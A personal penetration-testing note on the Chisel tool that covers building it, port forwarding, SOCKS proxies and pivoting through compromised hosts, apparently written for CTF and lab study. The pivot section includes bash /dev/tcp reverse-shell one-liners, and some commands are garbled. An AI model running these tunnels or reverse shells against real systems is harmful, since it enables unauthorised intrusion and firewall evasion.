# Chisel

Given the discrepancy between term used in [[Port-Redirection-And-Tunnelling]] as a authorial decision I am just going to try standardise the Offensive Security terminology - so read the linked article for information regard why this repository uses a particular set of definitions.

[Chisel](https://github.com/jpillora/chisel.git) *"is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (Golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."*

![](chiselworksthisway.png)


## Compilation and Shrinking the binary

```bash
#!/bin/bash
git clone https://github.com/jpillora/chisel.git 
cd chisel/
# On Victim machine:
ldd --version # linux and windows


# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w" 
# Build for windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
upx chisel

# IPsec stuff I failed to get workingchisel server --port 8080 --reverse
go build -ldflags="-s -w"
upx brute chisel
chiselsize=$(du -hs chisel)
echo "Chisel is now ready and minimised: "
echo $chiselsize
```

Ran either on Attack box or target box as a server or client

- Regarding `--socks5` and `:socks`
	- *"When the chisel server has `--socks5` enabled, remotes can specify "socks" in place of remote-host and remote-port.The default local host and port for a "socks" remote is 127.0.0.1:1080. Connections to this remote will terminate at the server's internal SOCKS5 proxy."*

- Regarding `--reverse` and `R:`... TLDR: `--reverse` allows reverse port forwarding, `R:` perform reverse port forward
	- *"When the chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote that they are reversed. That is, the server will listen and accept connections, and they will be proxied through the client which specified the remote. Reverse remotes specifying "`R:socks`" will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy."*

Capture `chisel` traffic with `tcpdump` 
```bash
sudo tcpdump -nvvvXi tun0 tcp port $PORT
```

## Local Port Forwarding

```bash
# AttackBox
# -host otherwise default is 0.0.0.0
# -v is useful for checking connection 
# interfaceIP host ip for a tunX 
chisel server --host $interfaceIP -p 10000 
# Client
chisel client $interfaceIP:10000 127.0.0.1:10001
```

## Remote/Reverse Port Forwarding

```bash
# AttackBox
# -host otherwise default is 0.0.0.0
# -v is useful for checking connection 
# interfaceIP host ip for a tunX 
chisel server --host $interfaceIP -p 10000 --reverse
# Client
# R .. reverse from
# :$local_host == any interface opening a :$local_port
# To some :$remote_host:$remote_port
chisel client $interfaceIP:10000 R:$local_host:$local_port:$remote_host:$remote_port
# For example from the machine with the server you want to curl an internal webpage on 10.10.11.1:443, with access only to a client on 10.10.10.1
chisel client $serverIP:10000 R:10.10.10.1:12345:10.10.11.1:443
```

## Dynamic Port Forwarding  

```bash
chisel server --host $interfaceIP -p 10000 -v --socks5
chisel client $interfaceIP:10000  10001:socks
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5 $serverIP $serverPort 
```

## Reverse Dynamic Socks Proxy

```bash
chisel server --host $interfaceIP -p 10000 -v --socks5 --reverse
chisel client $interfaceIP:10000  R:10001:socks
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5 $serverIP $serverPort 
```

## Reverse Pivot with Chisel Explained:

Chisel is useful when you can not port forward with ssh. You would then need chisel for reverse pivoting, which is the reverse of port forward as the  **Remote box is listening** to connect back the attack to open up the tunnel. For information about [[Port-Redirection-And-Tunnelling]].

```bash
# AttackBox
chisel server -p 10000 -reverse # -v is useful for checking connection 
# Client
chisel client $attackboxIP:1000 R:8001:$targetip:$targetport
# Accessing through the tunnel on Attackbox
curl 127.0.0.1:8001 # will then access $clientip:$port
```


## Local Pivots and Chaining with Chisel Explained

Using `nohup` and `&` will background a job on a shell - very useful on linux  

Presuming you have a reverse shell on both 192.168.0.1 and 192.168.0.2, where `chisel server` has opened port `10001` from `nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10002 &` with second reverse shell on 192.168.0.2 being: `bash -c 'bash -i >& /dev/tcp/192.168.0.1/10001 0>&1'`; consider the following as:
```bash
# 10.10.10.10 = kali
# 192.168.0.1 = externally facing compromised box 
# 192.168.0.2 = internal virtual network not exposed to internet
# 192.168.0.3 = internal virtual network not exposed to internet

chisel server -p 10000 -reverse -v
# 192.168.0.1 - $kali
nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10000 &
# 192.168.0.2 - 
nohup ./chisel client 192.168.0.1:10002 10002:127.0.0.1:10002 &
# Reverse shell from 192.168.0.3
bash -c 'bash -i >& /dev/tcp/192.168.0.2/10002 0>&1'
```

[Consideration for Windows](https://learn.microsoft.com/en-US/troubleshoot/windows-client/deployment/create-user-defined-service)

## `SSH` and `chisel` with `ncat` 

If we has chisel socks proxy we can ssh into 10.10.10.10 with both `ssh` and `ncat` through the pivot! `ssh` plus `ncat` and `ProxyCommand` configuration option for SSH SOCKS Proxy
```bash
# SSH Formatting Tokens for ProxyCommand
# %h = host
# %p = port
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' admin@10.10.10.10
```

## 0xDF's TD;DR Cheat Sheet 

Start server listening on 8000:

`./chisel server -p 8000 --reverse`

From victim machine:

Command | Description
--- | ---
`chisel client 10.10.14.3:8000 R:80:127.0.0.1:80` | Listen on Kali 80, forward to localhost port 80 on client
`chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80` | Listen on Kali 4444, forward to 10.10.10.240 port 80
`chisel client 10.10.14.3:8000 R:socks` | Create SOCKS5 listener on 1080 on Kali, proxy through clie

For SOCKS proxies don't forget `proxychains` and it configuration!


## References

[0xDF Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
[Alexis Rodriiguez Medium](https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683)
[Ippsec.Rocks](https://ippsec.rocks/?#)
[hdks](https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/#reverse-dynamic-socks-proxy)